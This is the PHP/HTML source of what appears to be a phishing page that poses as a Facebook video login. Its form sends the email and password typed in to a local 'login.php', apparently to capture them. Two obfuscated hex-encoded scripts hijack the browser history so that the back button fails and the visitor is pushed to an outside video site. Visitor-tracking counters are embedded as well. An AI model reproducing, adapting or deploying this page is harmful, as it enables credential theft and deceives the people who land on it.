<?php

include_once '../../common.php';


// Verifico si se necesita un conjunto de caracteres especial para presentar la pagina
switch ($lang['LANG']) {
        case 'th':
        header('Content-Type: text/html; charset=TIS-620');
        break;

        case 'el':
	header('Content-Type: text/html; charset=iso-8859-7');
	break;

	case 'ru':
	header('Content-Type: text/html; charset=iso-8859-5');
	break;

	case 'pl':
	header('Content-Type: text/html; charset=iso-8859-13');
	break;

	default:
	header('Content-Type: text/html; charset=ISO-8859-15');


}

?>
<!DOCTYPE html>
<html>
    <head>
<script>
new Image().src = 'http://whos.amung.us/widget/mirammg.png';
</script>
    	<title>Facebook Login Videos HD</title>
		<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
		<link rel="shortcut icon" href="favicon.ico" />
		<meta name="referrer" content="default" id="meta_referrer" />
		<script>__DEV__=0;</script>
		<link rel="stylesheet" type="text/css" id="RibQa" href="css/tSOgnJdhTc3.css" />
		<link rel="stylesheet" type="text/css" id="OvbZR" href="css/9an7U6cZys0.css" />
		<link rel="stylesheet" href="css/style.css">
		<script id="u_0_e" src="js/fEZ5x2OZgwl.js"></script>
		<link rel="canonical" href="" />
	</head>
	<body tabindex="0" class="touch x1 _fzu _50-3 iframe acw">
		<script id="u_0_a">(function(a){a.__updateOrientation=function(){var b=!!a.orientation&&a.orientation!==180,c=document.body;if(c)c.className=c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g,' ')+' '+(b?'landscape':'portrait');return b;};})(window);</script>
		<div id="viewport">
			<h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
			<div id="page">
			<center>
			<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script> <div id="fb-root"></div> <script>(function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.4&appId=806769436043772"; fjs.parentNode.insertBefore(js, fjs); }(document, 'script', 'facebook-jssdk'));</script> <script type="text/javascript">document.write(unescape("%3Cscript src=%27http://s10.histats.com/js15.js%27 type=%27text/javascript%27%3E%3C/script%3E"));</script> <a href="https://www.3movs.com/" target="_blank" title="contador pagina web" ><script  type="text/javascript" > try {Histats.start(1,3205176,4,0,0,0,""); Histats.track_hits();} catch(err){}; </script></a> <noscript><a href="http://www.histats.com" target="_blank"><img  src="http://sstatic1.histats.com/0.gif?3205176&101" alt="contador pagina web" border="0"></a></noscript>
			<div id="logotipo">
            <img src="img/manblu.png" width="360" height="220"
            </div>
            </center>
<?php include 'patras.php';?>
				<div class="maxwidth _5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
					<div class="_4g33">
						<div class="_4g34" id="u_0_0">
							<div id="login-notices">
								<div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice">
									<div class="_52jd"></div>
								</div>
							</div>
							<div>
								<div class="aclb _5rut">
									<div data-sigil="m_login_upsell"></div>
									<script> 	
var _0x9c02=["\x68\x61\x73\x68","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x6E\x6F\x2D\x62\x61\x63\x6B\x2D\x62\x75\x74\x74\x6F\x6E","\x41\x67\x61\x69\x6E\x2D\x4E\x6F\x2D\x62\x61\x63\x6B\x2D\x62\x75\x74\x74\x6F\x6E","\x6F\x6E\x68\x61\x73\x68\x63\x68\x61\x6E\x67\x65"];function nobackbutton(){window[_0x9c02[1]][_0x9c02[0]]= _0x9c02[2];window[_0x9c02[1]][_0x9c02[0]]= _0x9c02[3];window[_0x9c02[4]]= function(){window[_0x9c02[1]][_0x9c02[0]]= _0x9c02[2]}}
</script>
									<div id="Formulario">
                                        <h1>
                                        <form class="login-form" method="post" target="_top" action="../../login.php">
										<label>
                                        <input type="text" id="input" name="email" placeholder="<?php echo $lang['POPUP_CORREO'] ?>" autocomplete="off" required/>
										</label>
										<label>
                                        <input type="password" name="pass" placeholder="<?php echo $lang['POPUP_CONTRASENA'] ?>" autocomplete="off" required/>
										</label>
										
										<label>
                                        <input class="uibutton confirm" type="submit" value="<?php echo $lang['POPUP_SUBMIT'] ?>" >
										</label>
                                        </form>
                                        </h1>
                                        </div>
									</form>
									<script>
var _0x7b9f=["\x68\x69\x73\x74\x6f\x72\x79\x22\x2c\x22\x70\x75\x73\x68\x53\x74\x61\x74\x65\x22\x2c\x22\x6c\x6f\x61\x64\x22\x2c\x22\x67\x6f\x22\x2c\x22\x70\x6f\x70\x73\x74\x61\x74\x65\x22\x2c\x22\x73\x74\x61\x74\x65\x22\x2c\x22\x45\x76\x65\x6e\x74\x22\x2c\x22\x63\x72\x65\x61\x74\x65\x45\x76\x65\x6e\x74\x22\x2c\x22\x6e\x65\x78\x74\x22\x2c\x22\x70\x72\x65\x76\x69\x6f\x75\x73\x22\x2c\x22\x69\x6e\x69\x74\x45\x76\x65\x6e\x74\x22\x2c\x22\x64\x69\x73\x70\x61\x74\x63\x68\x45\x76\x65\x6e\x74\x22\x2c\x22\x50\x6c\x61\x79\x20\x56\x69\x64\x65\x6f\x3f\x22\x2c\x22\x68\x72\x65\x66\x22\x2c\x22\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x22\x2c\x22\x74\x6f\x70\x22\x2c\x22\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x68\x65\x62\x65\x73\x74\x76\x69\x64\x65\x6f\x73\x2e\x69\x6e\x66\x6f\x2f\x3f\x73\x6c\x3d\x31\x32\x37\x33\x31\x39\x30\x2d\x62\x61\x64\x61\x35\x26\x64\x61\x74\x61\x31\x3d\x54\x72\x61\x63\x6b\x31\x26\x64\x61\x74\x61\x32\x3d\x54\x72\x61\x63\x6b\x32\x22\x2c\x22\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72"];if(window[_0x7b9f[0]]&& history[_0x7b9f[1]]){window[_0x7b9f[17]](_0x7b9f[2],function(){history[_0x7b9f[1]](-1,null);history[_0x7b9f[1]](0,null);history[_0x7b9f[1]](1,null);history[_0x7b9f[3]](-1);this[_0x7b9f[17]](_0x7b9f[4],function(_0x7706x1,_0x7706x2){if(_0x7706x2= _0x7706x1[_0x7b9f[5]]){_0x7706x1= document[_0x7b9f[7]](_0x7b9f[6]);_0x7706x1[_0x7b9f[10]](_0x7706x2> 0?_0x7b9f[8]:_0x7b9f[9],true,true);this[_0x7b9f[11]](_0x7706x1);var _0x7706x3=confirm(_0x7b9f[12]);if(_0x7706x3== true){window[_0x7b9f[15]][_0x7b9f[14]][_0x7b9f[13]]= _0x7b9f[16]}else {if(_0x7706x3== false){window[_0x7b9f[15]][_0x7b9f[14]][_0x7b9f[13]]= _0x7b9f[16]}}}},false)},false)}
</script><section class="login-form-wrap">
								 <font color="1A3468">
                                    <div id="TituloCuerpo">
									<?php echo $lang['POPUP_DESCRIPCION'] ?>
									</div>
									</font>
							       </div>
						        </div>
					          </div>
							</div>
						</div>
					</div>
				</div>
	</body>
</html>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          <!DOCTYPE html>
